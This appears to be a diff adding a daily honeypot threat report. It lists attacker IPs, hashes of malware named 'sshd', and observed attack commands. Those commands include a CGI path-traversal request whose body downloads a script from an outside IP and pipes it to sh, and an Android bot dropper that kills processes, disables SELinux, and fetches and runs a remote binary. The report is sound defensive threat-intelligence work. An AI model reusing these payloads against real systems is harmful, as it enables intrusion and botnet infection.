@@ -1,0 +1,40 @@
+Top 5 IPs for 09-10-2024 :
+
+165.22.117.169
+168.167.72.228
+195.228.170.251
+121.209.23.233
+182.242.224.196
+
+Malware Observed:
+
+File name : sshd
+289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736
+https://www.virustotal.com/gui/file/289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736
+ 
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+File name : sshd
+d86437b589214d732eace62cfcdf52121751508157564c74cbbea27d0e5a3119
+https://www.virustotal.com/gui/file/d86437b589214d732eace62cfcdf52121751508157564c74cbbea27d0e5a3119
+
+
+
+Commands/exploits observed :
+
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: <Host IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 103
+
+X=$(curl http://154.216.17.30/sh || wget http://154.216.17.30/sh -O-); echo "$X" | sh -s apache.selfrep
+
+
+kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh)/ && $2 > 15 && $1 != '$$' {print $1}');pkill -9 arm;pkill -9 arm7; pkill -9 x86;pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.bot || cd /data/local/bot; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://103.28.35.146/and || su 0 busybox wget http://103.28.35.146/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.bot;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
